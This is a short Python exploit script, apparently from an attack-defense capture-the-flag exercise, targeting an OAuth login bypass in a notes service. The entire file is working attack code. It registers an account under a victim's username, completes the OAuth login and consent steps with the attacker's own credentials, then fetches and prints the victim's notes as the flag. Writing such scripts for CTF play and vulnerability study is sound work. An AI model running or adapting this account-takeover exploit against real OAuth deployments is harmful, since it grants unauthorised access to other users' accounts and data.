import sys
import string
import random
import base64
import requests

"""

This is the exploit script for vulnerability 3 (oAuth Login Bypass)
This program takes 2 arguments:

- ip-address
- flaguser (should be provided via flag id)

"""


def randomString():
    name = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(8))
    return name

def exploit(ip, username):
    s = requests.Session()
    email = f"{randomString()}@{randomString()}.com"
    password = randomString()

    s.post(f"http://{ip}:10101/auth/register", data = {"username": username, "email": email, "password": password})
    resp = s.get(f"http://{ip}:10100/oauth/login")
    resp2 = s.post(resp.url, data = {"email": email, "password": password})
    s.post(resp2.url, data = {"confirm": "on"})

    flag = s.get(f"http://{ip}:10100/notes")
    print(f"FLAG IS: {flag.text}")

if __name__ == "__main__":
    args = sys.argv[1:]
    if len(args) != 2:
        print("Usage: python exploit3.py [SERVICE-IP-ADDRESS] [USERNAME/FLAG-ID]")
        sys.exit(1)

    ip = args[0]
    username = args[1]
    exploit(ip, username)
